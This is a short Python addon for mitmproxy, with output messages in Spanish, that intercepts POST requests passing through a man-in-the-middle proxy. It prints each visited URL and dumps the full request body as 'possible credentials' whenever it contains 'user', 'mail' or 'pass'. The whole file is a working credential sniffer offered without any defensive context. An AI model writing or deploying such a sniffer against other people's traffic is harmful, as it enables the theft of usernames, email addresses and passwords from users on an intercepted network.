#!/usr/bin/env python3

from mitmproxy import http
from urllib.parse import urlparse
import json

def has_keywords(keywords, data):
    return any(keyword in data for keyword in keywords)

def request(packet):
    
    if packet.request.method != "POST":
        return

    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path
    
    print(f"[+] URL visitada: {scheme}://{domain}{path}")
    
    keywords = ["user", "mail", "pass"]
    data = packet.request.get_text()

    if has_keywords(keywords, data):

        print(f"\n[+] Posibles credenciales: {data}\n")
